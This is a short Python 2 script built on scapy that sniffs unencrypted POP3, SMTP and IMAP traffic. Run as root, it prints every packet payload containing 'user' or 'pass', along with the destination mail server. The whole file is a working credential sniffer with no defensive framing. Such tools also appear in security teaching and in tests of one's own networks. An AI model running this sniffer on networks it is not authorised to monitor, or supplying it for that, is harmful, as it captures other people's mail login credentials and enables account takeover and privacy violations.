#!/usr/bin/env python

import os, sys
from scapy.all import *


def printTitle():
    print '\n'
    print '===' * 20
    print 'Scanning for unencrypted mail traffic....'
    print '===' * 20
    print '\n'



def packetCallback(packet):
    if packet[TCP].payload:
        mailPacket = str(packet[TCP].payload)
        if "user" in mailPacket.lower() or "pass" in mailPacket.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload

if __name__ == '__main__':
    try:
        printTitle()
        if os.getuid() is not 0:
            sys.exit('\033[31;3m[!]\033[0m You must run this script as root.')
        else:
            sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packetCallback,store=0)
    except Exception, err:
        print "\033[31;3m[-]\033[0m Error, %s" % err
